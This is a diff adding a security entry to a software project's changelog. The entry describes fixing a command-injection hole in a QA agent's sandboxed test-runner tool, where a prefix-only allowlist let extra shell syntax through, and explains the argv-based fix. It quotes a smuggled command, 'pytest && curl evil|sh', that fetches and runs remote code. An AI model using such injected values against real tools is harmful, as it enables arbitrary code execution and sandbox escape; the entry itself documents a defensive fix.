@@ -69,6 +69,23 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
 
 ### Security
 
+- **`pytest_exec` (`ShellExecTool`) no longer executes through a shell (#3679):**
+  the allowlist previously vetted only the command string's leading prefix,
+  then handed the whole, unmodified string to `/bin/sh -c` — anything after
+  the recognized prefix (`pytest && curl evil|sh`) was live shell syntax, a
+  full arbitrary-command-execution hole in what's documented as the QA
+  agent's sandbox. `resolve_allowed_argv()` now quote-aware tokenizes the
+  command and requires the entire leading token sequence to exactly match a
+  known test-runner invocation (whole-token comparison, never a string
+  prefix, so `pytest-evil` cannot pass as `pytest`), and `execute()` runs the
+  resolved argv directly via `Command::new(program).args(rest)` with no shell
+  spawned at all — the actual fix, since any metacharacter that slipped
+  through validation would now just be an inert argv element. A trailing
+  `2>&1` (the one shell-redirection form the QA prompt emits) is stripped as
+  a no-op carve-out rather than passed through a shell. Pre-existing on
+  `main`, found during #3466 adversarial review and deliberately deferred to
+  this dedicated fix.
+
 - **Assistant no longer leaks internal orchestration or disclaims delegating
   when dispatched via `--direct`/`--agent` (#3550 follow-up):** a live smoke
   test (`tagent --direct assistant --task "..."`) proved the black-box/tool
